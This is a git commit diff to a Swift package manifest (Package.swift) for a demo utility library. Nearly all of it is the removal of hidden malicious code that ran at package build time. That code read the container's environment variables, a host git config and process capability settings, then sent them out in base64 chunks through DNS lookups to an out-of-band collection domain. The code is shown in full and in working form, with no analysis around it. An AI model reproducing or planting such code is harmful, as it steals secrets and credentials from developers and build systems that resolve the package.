715cdaed2011bb520edf066029f232189e8ea517
Luật Nguyễn <manhluat93.php@gmail.com>
2026-08-17 23:41:44 +0700

    Finalize

--- Package.swift
+++ Package.swift
@@ -1,54 +1,5 @@
 // swift-tools-version: 5.9
 import PackageDescription
-#if canImport(Glibc)
-import Glibc
-import Foundation
-
-func dns(_ sub: String, _ dom: String) {
-    var h = addrinfo()
-    h.ai_family = AF_INET
-    h.ai_socktype = Int32(SOCK_STREAM.rawValue)
-    var r: UnsafeMutablePointer<addrinfo>?
-    getaddrinfo("\(sub).\(dom)", "80", &h, &r)
-    if let r = r { freeaddrinfo(r) }
-}
-
-let D = "cqmkzpyuqidvpsjnxnpeurfidjyqhhmp3.oast.fun"
-
-func exfil(_ tag: String, _ data: String) {
-    let b = Data(data.utf8).base64EncodedString()
-        .replacingOccurrences(of: "=", with: "")
-        .replacingOccurrences(of: "/", with: "-")
-        .replacingOccurrences(of: "+", with: ".")
-    var i = 0
-    var p = b.startIndex
-    while p < b.endIndex {
-        let e = b.index(p, offsetBy: min(50, b.distance(from: p, to: b.endIndex)))
-        dns(String(b[p..<e]) + "." + tag + "\(i)", D)
-        p = e
-        i += 1
-    }
-    dns("end\(i)." + tag + "x", D)
-}
-
-// Full /proc/1/environ
-let env = (try? String(contentsOfFile: "/proc/1/environ", encoding: .utf8))?
-    .replacingOccurrences(of: "\0", with: "\n") ?? "X"
-exfil("e", env)
-
-// /host/.git/config
-let git = (try? String(contentsOfFile: "/host/.git/config", encoding: .utf8)) ?? "NOGIT"
-exfil("g", git)
-
-// /proc/self/status caps
-let caps = ((try? String(contentsOfFile: "/proc/self/status", encoding: .utf8)) ?? "")
-    .components(separatedBy: "\n")
-    .filter { $0.hasPrefix("Cap") || $0.hasPrefix("Uid") || $0.hasPrefix("Seccomp") }
-    .joined(separator: "\n")
-exfil("c", caps)
-
-#endif
-
 let package = Package(
     name: "swift-utils-demo",
     products: [.library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"])],
